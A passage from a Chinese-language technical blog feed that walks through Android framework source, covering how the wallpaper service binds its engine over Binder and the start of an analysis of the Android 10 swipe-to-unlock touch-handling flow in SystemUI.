e) &#123;</span><br><span class="line">        <span class="comment">// 未能在显示屏上添加壁纸</span></span><br><span class="line">        Slog.w(TAG, <span class="string">&quot;Failed attaching wallpaper on display&quot;</span>, e);</span><br><span class="line">        <span class="keyword">if</span> (wallpaper != <span class="literal">null</span> &amp;&amp; !wallpaper.wallpaperUpdating</span><br><span class="line">                &amp;&amp; connection.getConnectedEngineSize() == <span class="number">0</span>) &#123;</span><br><span class="line">            bindWallpaperComponentLocked(<span class="literal">null</span> <span class="comment">/* componentName */</span>, <span class="literal">false</span> <span class="comment">/* force */</span>,</span><br><span class="line">                    <span class="literal">false</span> <span class="comment">/* fromUser */</span>, wallpaper, <span class="literal">null</span> <span class="comment">/* reply */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attach() 方法回传了很多信息，其中 connection 为 WallpaperConnection 的实例。WallpaperConnection 之所以具有跨进程通信的能力是因为继承了IWallpaperConnection.Stub 类。</p><blockquote><p>该 Stub 对象中有一个重要的方法 attachEngine() 方法，因为 Engine 实现才是动态壁纸的核心，WallpaperService 会将创建好的 Engine 引用通过 attachEngine() 回传给 WallpaperManagerService 进行管理。</p></blockquote><p>IWallpaperServiceWrapper 继承了 IWallpaperService.Stub，并实现了该接口的两个方法 attach() 和 detach()。</p><p><strong>IWallpaperServiceWrapper</strong><br><strong>frameworks/base/core/java/android/service/wallpaper/WallpaperService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">IWallpaperServiceWrapper</span> <span class="keyword">extends</span> <span class="title class_">IWallpaperService</span>.Stub &#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> WallpaperService mTarget;</span><br><span class="line">      <span class="keyword">private</span> IWallpaperEngineWrapper mEngineWrapper;</span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">IWallpaperServiceWrapper</span><span class="params">(WallpaperService context)</span> &#123;</span><br><span class="line">          mTarget = context;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(IWallpaperConnection conn, IBinder windowToken,</span></span><br><span class="line"><span class="params">      <span class="type">int</span> windowType, <span class="type">boolean</span> isPreview, <span class="type">int</span> reqWidth, <span class="type">int</span> reqHeight, Rect padding,<span class="type">int</span> displayId)</span> &#123;</span><br><span class="line">          mEngineWrapper = <span class="keyword">new</span> <span class="title class_">IWallpaperEngineWrapper</span>(mTarget, conn, windowToken,</span><br><span class="line">                  windowType, isPreview, reqWidth, reqHeight, padding, displayId);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;</span><br><span class="line">          mEngineWrapper.detach();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在 attach() 方法中创建了一个 IWallpaperEngineWrapper 对象 mEngineWrapper 。</p><p><strong>IWallpaperEngineWrapper</strong><br><strong>frameworks/base/core/java/android/service/wallpaper/WallpaperService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">IWallpaperEngineWrapper</span> <span class="keyword">extends</span> <span class="title class_">IWallpaperEngine</span>.Stub</span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">HandlerCaller</span>.Callback &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HandlerCaller mCaller;</span><br><span class="line">    <span class="keyword">final</span> IWallpaperConnection mConnection;</span><br><span class="line">    <span class="keyword">final</span> IBinder mWindowToken;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> mWindowType;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> mIsPreview;</span><br><span class="line">    <span class="type">boolean</span> mShownReported;</span><br><span class="line">    <span class="type">int</span> mReqWidth;</span><br><span class="line">    <span class="type">int</span> mReqHeight;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Rect</span> <span class="variable">mDisplayPadding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rect</span>();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> mDisplayId;</span><br><span class="line">    <span class="keyword">final</span> DisplayManager mDisplayManager;</span><br><span class="line">    <span class="keyword">final</span> Display mDisplay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicBoolean</span> <span class="variable">mDetached</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>();</span><br><span class="line">    Engine mEngine;</span><br><span class="line">    IWallpaperEngineWrapper(WallpaperService context,</span><br><span class="line">            IWallpaperConnection conn, IBinder windowToken,</span><br><span class="line">            <span class="type">int</span> windowType, <span class="type">boolean</span> isPreview, <span class="type">int</span> reqWidth, <span class="type">int</span> reqHeight, Rect padding,</span><br><span class="line">            <span class="type">int</span> displayId) &#123;</span><br><span class="line">        mCaller = <span class="keyword">new</span> <span class="title class_">HandlerCaller</span>(context, context.getMainLooper(), <span class="built_in">this</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="comment">// 该消息用于壁纸服务引擎的创建</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> mCaller.obtainMessage(DO_ATTACH);</span><br><span class="line">        mCaller.sendMessage(msg);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeMessage</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mDetached.get()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mActiveEngines.contains(mEngine)) &#123;</span><br><span class="line">                doDetachEngine();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (message.what) &#123;</span><br><span class="line">            <span class="keyword">case</span> DO_ATTACH: &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 将IWallpaperEngineWapper对象传递给WallpaperConnection进行保存，</span></span><br><span class="line">                    <span class="comment">// 通过这个引用，WallpaperManagerService也可以通过它与engine进行通信</span></span><br><span class="line">                    mConnection.attachEngine(<span class="built_in">this</span>, mDisplayId);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    Log.w(TAG, <span class="string">&quot;Wallpaper host disappeared&quot;</span>, e);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 创建一个引擎，该方法为抽象方法，需要子类根据自身实现具体的引擎</span></span><br><span class="line">                <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> onCreateEngine();</span><br><span class="line">                mEngine = engine;</span><br><span class="line">                mActiveEngines.add(engine);</span><br><span class="line">                <span class="comment">// 该方法中会完成窗口的创建、surface创建等工作。</span></span><br><span class="line">                engine.attach(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 mConnection.attachEngine() 方法将 IWallpaperEngineWrapper 传递给了WallpaperManagerService，因此 WallpaperManagerService 可以转发相关的请求和设置到 Engine 对象中，实现 WallpaperManagerService 到壁纸的通信。onCreateEngine() 方法执行后，引擎创建完成，之后通过 engine.attach()方法进行引擎相关的初始化。<br><strong>frameworks/base/core/java/android/service/wallpaper/WallpaperService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Engine</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(IWallpaperEngineWrapper wrapper)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;attach: &quot;</span> + <span class="built_in">this</span> + <span class="string">&quot; wrapper=&quot;</span> + wrapper);</span><br><span class="line">        <span class="keyword">if</span> (mDestroyed) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mIWallpaperEngine = wrapper;</span><br><span class="line">        mCaller = wrapper.mCaller;</span><br><span class="line">        mConnection = wrapper.mConnection;</span><br><span class="line">        mWindowToken = wrapper.mWindowToken;</span><br><span class="line">        mSurfaceHolder.setSizeFromLayout();</span><br><span class="line">        mInitializing = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 这个session用于和WMS进行通信</span></span><br><span class="line">        mSession = WindowManagerGlobal.getWindowSession();</span><br><span class="line">        <span class="comment">// mWindow是一个IWindow对象，用于接收从WMS发送过来的消息</span></span><br><span class="line">        mWindow.setSession(mSession);</span><br><span class="line">        mLayout.packageName = getPackageName();</span><br><span class="line">        mIWallpaperEngine.mDisplayManager.registerDisplayListener(mDisplayListener,</span><br><span class="line">                mCaller.getHandler());</span><br><span class="line">        mDisplay = mIWallpaperEngine.mDisplay;</span><br><span class="line">        mDisplayContext = createDisplayContext(mDisplay);</span><br><span class="line">        mDisplayState = mDisplay.getState();</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;onCreate(): &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// 子类可以重写该接口，在该接口中可以修改mSurfaceHolder相关的属性，这个时候</span></span><br><span class="line">        <span class="comment">// 窗口尚未创建。设置的相关属性将在updateSurface中创建窗口时使用</span></span><br><span class="line">        onCreate(mSurfaceHolder);</span><br><span class="line">        mInitializing = <span class="literal">false</span>;</span><br><span class="line">        mReportedVisible = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// updateSurface会进行窗口以及Surface的创建。</span></span><br><span class="line">        updateSurface(<span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attach() 方法执行的完成，标志着壁纸启动的完成，之后可以调用壁纸的 surface 显示图像。</p><p><img src="/images/20231231/20231231093328.png"></p><p>在WallpaperManagerService和WallpaperService交互的过程中，主要有下面三个跨进程通信的Binder对象：</p><ul><li>WallpaperConnection：实现在WallpaperManagerService中，并通过IWallpaperService.attach回调传递给了IWallpaperEngineWrapper，通过WallpaperConnection.attachEngine()方法，WallpaperService将IWallpaperEngineWrapper回传给了WallpaperManagerService，实现了双向的通信。</li><li>IWallpaperService：实现在WallpaperService中，该对象提供了attach方法，用于从WallpaperManagerService获取引擎创建时需要的WindowToken等信息。</li><li>IWallpaperEngineWrapper：实现在壁纸服务进程中，同时引用交给了WallpaperManagerService，该对象封装了Engine类，WallpaperManagerService对引擎相关的控制需要通过该对象提供的接口实现。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 滑动解锁流程</title>
      <link href="/2023/12/30/2023-12-30/"/>
      <url>/2023/12/30/2023-12-30/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>滑动解锁相对于来说逻辑还是简单的，说白了就是对事件的处理，然后做一些事。<br>这里主要从锁屏的界面Layout结构、touchEvent事件分发、解锁动作逻辑几个方面进行源码的分析。</p><h3 id="锁屏的界面Layout结构分析"><a href="#锁屏的界面Layout结构分析" class="headerlink" title="锁屏的界面Layout结构分析"></a>锁屏的界面Layout结构分析</h3><p><strong>StatusbarWindowView</strong><br>整个锁屏界面的顶级 View 就是 StatusbarWindowView；<br><strong>StatusBar#createAndAddWindows()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBar.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createAndAddWindows</span><span class="params">(<span class="meta">@Nullable</span> RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">    makeStatusBarView(result);</span><br><span class="line">    mNotificationShadeWindowController.attach();</span><br><span class="line">    <span class="comment">// 添加视图</span></span><br><span class="line">    mStatusBarWindowController.attach();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>StatusBarWindowController#attach()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarWindowController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Now that the status bar window encompasses the sliding panel and its</span></span><br><span class="line">    <span class="comment">// translucent backdrop, the entire thing is made TRANSLUCENT and is</span></span><br><span class="line">    <span class="comment">// hardware-accelerated.</span></span><br><span class="line">    mLp = <span class="keyword">new</span> <span class="title class_">WindowManager</span>.LayoutParams(</span><br><span class="line">            ViewGroup.LayoutParams.MATCH_PARENT,</span><br><span class="line">            mBarHeight,</span><br><span class="line">            WindowManager.LayoutParams.TYPE_STATUS_BAR,</span><br><span class="line">            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE</span><br><span class="line">                    | WindowManager.LayoutParams.FLAG_SPLIT_TOUCH</span><br><span class="line">                    | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS,</span><br><span class="line">            PixelFormat.TRANSLUCENT);</span><br><span class="line">    mLp.privateFlags |= PRIVATE_FLAG_COLOR_SPACE_AGNOSTIC;</span><br><span class="line">    mLp.token = <span class="keyword">new</span> <span class="title class_">Binder</span>();</span><br><span class="line">    mLp.gravity = Gravity.TOP;</span><br><span class="line">    mLp.setFitInsetsTypes(<span class="number">0</span> <span class="comment">/* types */</span>);</span><br><span class="line">    mLp.setTitle(<span class="string">&quot;StatusBar&quot;</span>);</span><br><span class="line">    mLp.packageName = mContext.getPackageName();</span><br><span class="line">    mLp.layoutInDisplayCutoutMode = LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;</span><br><span class="line">    mWindowManager.addView(mStatusBarView, mLp);</span><br><span class="line">    mLpChanged.copyFrom(mLp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StatusBarWindow 是在 StatusBar 的 createAndAddWindows() 流程中调用StatusBarWindowController.attach() 添加到窗口上的， type为WindowManager.LayoutParams.TYPE_STATUS_BAR</p><h3 id="Layout结构"><a href="#Layout结构" class="headerlink" title="Layout结构"></a>Layout结构</h3><p>锁屏界面的Layout结构可以简单概括为以下结构：</p><ul><li>mStatusBarWindow–&gt; R.layout.super_status_bar</li><li>notification_panel–&gt; R.layout.status_bar_expanded</li><li>keyguardBouncer–&gt;R.layout.keyguard_bouncer<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mStatusBarWindow--&gt;notification_panel--&gt;notification_container_parent--&gt;keyguard_header（锁屏状态栏）</span><br><span class="line">                |                    |</span><br><span class="line">                |                    --&gt;keyguard_bottom_area （lock_icon和充电状态等）</span><br><span class="line">                |                    |</span><br><span class="line">                |                    --&gt;keyguard_status_view （锁屏时钟日期）</span><br><span class="line">                |                    |</span><br><span class="line">                |                    --&gt;keyguard_up_slide （箭头提示动画）</span><br><span class="line">                |</span><br><span class="line">                --&gt;keyguardBouncer（安全锁界面）</span><br></pre></td></tr></table></figure></li></ul><h3 id="touchEvent事件分发"><a href="#touchEvent事件分发" class="headerlink" title="touchEvent事件分发"></a>touchEvent事件分发</h3><p>我们这里分析上滑解锁过程中的touchEvent事件分发<br>android中的事件分发概念：事件序列。</p><h3 id="事件序列"><a href="#事件序列" class="headerlink" title="事件序列"></a>事件序列</h3><p>在Android系统中，一个单独的事件基本上是没什么作用的，只有一个事件序列，才有意义。一个事件序列正常情况下，定义为 DOWN、MOVE（0或者多个）、UP/CANCEL。事件序列以DOWN事件开始，中间会有0或者多个MOVE事件，最后以UP事件或者CANCEL事件结束。<br>DOWN事件作为序列的开始，有一个很重要的职责，就是寻找事件序列的接受者，怎么理解呢？framework 在DOWN事件的传递过程中，需要根据View事件处理方法（onTouchEvent）的返回值来确定事件序列的接受者。如果一个View的onTouchEvent事件，在处理DOWN事件的时候返回true，说明它愿意接受并处理该事件序列。</p><h3 id="上滑解锁"><a href="#上滑解锁" class="headerlink" title="上滑解锁"></a>上滑解锁</h3><p>当用户移动手指时，产生touch down事件，最外层view StatusBarWindowView会执行onInterceptTouchEvent，看是否需要拦截touch事件。再一级级往子View传递，都没有被拦截，之后执行OnTouchEvent从子View开始一级级往父View传递，到PanelView这里当手指移动的距离达到一定的阈值会调用onTrackingStarted从而设置mTracking的值为true，onTouchEvent返回true，接收此touch move事件，之后的touch事件直接传到此View。<br>在用户滑动过程会调用setExpandedHeightInternal,进而调用NotificationPanelView的onHeightUpdated进行锁屏上的时间和通知View根据手指的移动距离进行缩小、变透明处理。<br>当用户抬起手指时，产生touch up事件，PanelView接收到这个事件后会调用endMotionEvent，如果手指从down到up之间移动的距离达到一定阈值会调用onTrackingStopped。</p><ol><li>硬件发出指令：按下，移动，抬起</li><li>input接收</li><li>代码执行相应操作：ACTION_DOWN，ACTION_MOVE，ACTION_UP</li></ol><p><strong>PanelView#onInterceptTouchEvent()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelView.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onInterceptTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mTouchHandler.onInterceptTouchEvent(event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PanelViewController</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelViewController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchHandler</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnTouchListener &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onInterceptTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (mInstantExpanding || !mNotificationsDragEnabled || mTouchDisabled || (mMotionAborted</span><br><span class="line">                 &amp;&amp; event.getActionMasked() != MotionEvent.ACTION_DOWN)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">          * If the user drags anywhere inside the panel we intercept it if the movement is</span></span><br><span class="line"><span class="comment">          * upwards. This allows closing the shade from anywhere inside the panel.</span></span><br><span class="line"><span class="comment">          *</span></span><br><span class="line"><span class="comment">          * We only do this if the current content is scrolled to the bottom,</span></span><br><span class="line"><span class="comment">          * i.e canCollapsePanelOnTouch() is true and therefore there is no conflicting scrolling</span></span><br><span class="line"><span class="comment">          * gesture</span></span><br><span class="line"><span class="comment">          * possible.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">         <span class="type">int</span> <span class="variable">pointerIndex</span> <span class="operator">=</span> event.findPointerIndex(mTrackingPointer);</span><br><span class="line">         <span class="keyword">if</span> (pointerIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">             pointerIndex = <span class="number">0</span>;</span><br><span class="line">             mTrackingPointer = event.getPointerId(pointerIndex);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">float</span> <span class="variable">x</span> <span class="operator">=</span> event.getX(pointerIndex);</span><br><span class="line">         <span class="keyword">final</span> <span class="type">float</span> <span class="variable">y</span> <span class="operator">=</span> event.getY(pointerIndex);</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">canCollapsePanel</span> <span class="operator">=</span> canCollapsePanelOnTouch();</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">switch</span> (event.getActionMasked()) &#123;</span><br><span class="line">             <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">                 mStatusBar.userActivity();</span><br><span class="line">                 mAnimatingOnDown = mHeightAnimator != <span class="literal">null</span>;</span><br><span class="line">                 